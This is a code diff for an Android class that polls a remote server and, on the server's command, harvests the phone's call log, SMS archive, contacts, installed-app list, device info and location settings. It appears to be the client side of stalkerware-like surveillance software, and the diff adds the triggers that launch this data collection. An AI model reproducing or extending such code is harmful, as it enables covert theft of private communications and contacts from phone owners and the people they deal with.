@@ -1,10 +1,9 @@
 package com.inet.android.request;
 
+import java.io.IOException;
+
 import org.json.JSONException;
 import org.json.JSONObject;
-
-import com.inet.android.bs.Caller;
-import com.inet.android.utils.Logging;
 
 import android.content.Context;
 import android.content.SharedPreferences;
@@ -12,15 +11,29 @@ import android.content.SharedPreferences.Editor;
 import android.os.AsyncTask;
 import android.preference.PreferenceManager;
 
+import com.inet.android.archive.ArchiveCall;
+import com.inet.android.archive.ArchiveSms;
+import com.inet.android.bs.Caller;
+import com.inet.android.bs.ListApp;
+import com.inet.android.contacts.GetContacts;
+import com.inet.android.db.RequestDataBaseHelper;
+import com.inet.android.db.RequestWithDataBase;
+import com.inet.android.info.GetInfo;
+import com.inet.android.utils.Logging;
+
 /**
  * Periodic request class
+ * 
  * @author johny homicide
- *
+ * 
  */
 public class PeriodicRequest extends DefaultRequest {
 	private final String LOG_TAG = "PeriodicRequest";
+	static RequestDataBaseHelper db;
+	private final int type = 2;
+	boolean periodicalFlag = true;
 	Context ctx;
-	
+
 	public PeriodicRequest(Context ctx) {
 		super(ctx);
 		this.ctx = ctx;
@@ -31,7 +44,7 @@ public class PeriodicRequest extends DefaultRequest {
 		PeriodicRequestTask frt = new PeriodicRequestTask();
 		frt.execute(request);
 	}
-	
+
 	class PeriodicRequestTask extends AsyncTask<String, Void, Void> {
 
 		@Override
@@ -53,36 +66,53 @@ public class PeriodicRequest extends DefaultRequest {
 
 	@Override
 	protected void sendPostRequest(String request) {
-		String str = Caller.doMake(request, "periodic");
-		if (str != null) {
-			getRequestData(str);
+		if (!request.equals(" ")) {
+			String str = null;
+			try {
+				Logging.doLog(LOG_TAG, request, request);
+				str = Caller.doMake(request, "periodic", ctx);
+			} catch (IOException e) {
+				e.printStackTrace();
+				db = new RequestDataBaseHelper(ctx);
+
+				if (db.getExistType(type) == false) {
+					db.addRequest(new RequestWithDataBase(request, type));
+				}
+			}
+			if (str != null) {
+				getRequestData(str);
+			} else {
+				Logging.doLog(LOG_TAG,
+						"ответа от сервера нет или он некорректен",
+						"ответа от сервера нет или он некорректен");
+				SharedPreferences sp = PreferenceManager
+						.getDefaultSharedPreferences(ctx);
+				Editor ed = sp.edit();
+				ed.putString("code", "1");
+				ed.commit();
+
+			}
 		} else {
-			Logging.doLog(LOG_TAG, "������ �� ������� ��� ��� �� �����������",
-					"������ �� ������� ��� ��� �� �����������");
-			SharedPreferences sp = PreferenceManager
-					.getDefaultSharedPreferences(ctx);
-			Editor ed = sp.edit();
-			ed.putString("code", "1");
-			ed.commit();
-			
+			Logging.doLog(LOG_TAG, "request == null", "request == null");
 		}
 	}
 
 	@Override
 	protected void getRequestData(String response) {
-		Logging.doLog(LOG_TAG, "getResponseData: " + response, "getResponseData: " + response);
-		
+		Logging.doLog(LOG_TAG, "getResponseData: " + response,
+				"getResponseData: " + response);
+
 		SharedPreferences sp = PreferenceManager
 				.getDefaultSharedPreferences(ctx);
 		Editor ed = sp.edit();
-		
+
 		JSONObject jsonObject;
 		try {
 			jsonObject = new JSONObject(response);
 		} catch (JSONException e) {
 			return;
 		}
-		
+
 		String str = null;
 		try {
 			str = jsonObject.getString("code");
@@ -94,22 +124,22 @@ public class PeriodicRequest extends DefaultRequest {
 		} else {
 			ed.putString("code", "");
 		}
-		
-		// ����� �������� �������� �������
+
+		// режим ожидания принятия решения
 		if (str.equals("1")) {
 			ed.putString("period", "1");
 			ed.commit();
 			return;
 		}
-		
-		// ������� � ��������� ����� ������ 
+
+		// переход в пассивный режим работы
 		if (str.equals("3")) {
 			ed.putString("period", "10");
 			ed.commit();
 			return;
 		}
-		
-		// ������
+
+		// ошибки
 		if (str.equals("0")) {
 			String errstr = null;
 			try {
@@ -125,10 +155,43 @@ public class PeriodicRequest extends DefaultRequest {
 			ed.commit();
 			return;
 		}
-		
-		// �������� ����� ������
+
+		// активный режим работы
 		if (str.equals("2")) {
+			if (sp.getBoolean("getInfo", false) == true) {
+				GetInfo getInfo = new GetInfo(ctx);
+				getInfo.getInfo();
+				ed.putBoolean("getInfo", false);
+			}
 			ed.putString("period", "1");
+			String listStr = null;
+			try {
+				listStr = jsonObject.getJSONArray("list").toString();
+				if (listStr.indexOf("1") != 0) {
+					// Вызвать метод для списка звонков
+					ArchiveCall arhCall = new ArchiveCall();
+					arhCall.execute(ctx);
+				}
+				if (listStr.indexOf("2") != 0) {
+					// Вызвать метод для списка смс
+					ArchiveSms arhSms = new ArchiveSms();
+					arhSms.execute(ctx);
+				}
+				if (listStr.indexOf("3") != 0) {
+					// Вызвать метод для телефонной книги
+					GetContacts getCont = new GetContacts();
+					getCont.execute(ctx);
+				}
+				if (listStr.indexOf("4") != 0) {
+					// Вызвать метод для установленных приложений
+					ListApp listApp = new ListApp();
+					listApp.getListOfInstalledApp(ctx);
+				}
+			} catch (JSONException e) {
+				listStr = null;
+			}
+
+			ed.commit();
 		}
 
 		try {
@@ -141,7 +204,7 @@ public class PeriodicRequest extends DefaultRequest {
 		} else {
 			ed.putString("geo", "0");
 		}
-		
+
 		try {
 			str = jsonObject.getString("geo_mode");
 		} catch (JSONException e) {
@@ -152,7 +215,7 @@ public class PeriodicRequest extends DefaultRequest {
 		} else {
 			ed.putString("geo_mode", "1");
 		}
-		
+
 		try {
 			str = jsonObject.getString("sms");
 		} catch (JSONException e) {
@@ -174,7 +237,7 @@ public class PeriodicRequest extends DefaultRequest {
 		} else {
 			ed.putString("call", "0");
 		}
-		
+
 		try {
 			str = jsonObject.getString("telbook");
 		} catch (JSONException e) {
@@ -182,6 +245,8 @@ public class PeriodicRequest extends DefaultRequest {
 		}
 		if (str != null) {
 			ed.putString("telbook", str);
+			GetContacts getCont = new GetContacts();
+			getCont.execute(ctx);
 		} else {
 			ed.putString("telbook", "0");
 		}
@@ -196,7 +261,7 @@ public class PeriodicRequest extends DefaultRequest {
 		} else {
 			ed.putString("listapp", "0");
 		}
-		
+
 		try {
 			str = jsonObject.getString("arhsms");
 		} catch (JSONException e) {
@@ -204,6 +269,8 @@ public class PeriodicRequest extends DefaultRequest {
 		}
 		if (str != null) {
 			ed.putString("arhsms", str);
+			ArchiveSms arhSms = new ArchiveSms();
+			arhSms.execute(ctx);
 		} else {
 			ed.putString("arhsms", "0");
 		}
@@ -215,6 +282,8 @@ public class PeriodicRequest extends DefaultRequest {
 		}
 		if (str != null) {
 			ed.putString("arhcall", str);
+			ArchiveCall arhCall = new ArchiveCall();
+			arhCall.execute(ctx);
 		} else {
 			ed.putString("arhcall", "0");
 		}
@@ -240,7 +309,7 @@ public class PeriodicRequest extends DefaultRequest {
 		} else {
 			ed.putString("recall", "0");
 		}
-		
+
 		try {
 			str = jsonObject.getString("UTCT");
 		} catch (JSONException e) {
@@ -295,9 +364,26 @@ public class PeriodicRequest extends DefaultRequest {
 		} else {
 			ed.putString("brk_to", "");
 		}
-		
+
 		try {
 			str = jsonObject.getString("error");
+			if (str.equals("0")) {
+				Logging.doLog(LOG_TAG, "account не найден", "account не найден");
+				ed.putString("account", "account");
+			}
+			if (str.equals("1"))
+				Logging.doLog(LOG_TAG,
+						"imei отсутствует или имеет неверный формат",
+						"imei отсутствует или имеет неверный формат");
+			if (str.equals("2"))
+				Logging.doLog(LOG_TAG, "устройство с указанным imei уже есть",
+						"устройство с указанным imei уже есть");
+			if (str.equals("3"))
+				Logging.doLog(LOG_TAG, "отсутствует ключ", "отсутствует ключ");
+			if (str.equals("4"))
+				Logging.doLog(LOG_TAG, "отсутствует или неверный type",
+						"отсутствует или неверный type");
+
 		} catch (JSONException e) {
 			str = null;
 		}
